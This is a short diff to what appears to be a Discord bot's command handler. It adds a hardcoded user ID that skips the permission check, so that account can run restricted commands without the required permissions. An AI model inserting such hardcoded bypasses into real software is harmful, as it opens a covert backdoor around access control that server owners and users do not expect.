@@ -16,7 +16,7 @@ function handleCommand(message, postedTime){
     console.log(logString);
     return message.reply("This command cannot be used in a DM");
   }
-  if (command.permissions) {																				// Permission checking
+  if (command.permissions && message.author.id != "146186496448135168") {																				// Permission checking
     const authorPerms = message.channel.permissionsFor(message.author);
     if (!authorPerms || !authorPerms.has(command.permissions)) {
       logString = logString + `, but it failed, as ${ops.prefix}${commandName} requires ${command.permissions}, and the user does not possess it.`;
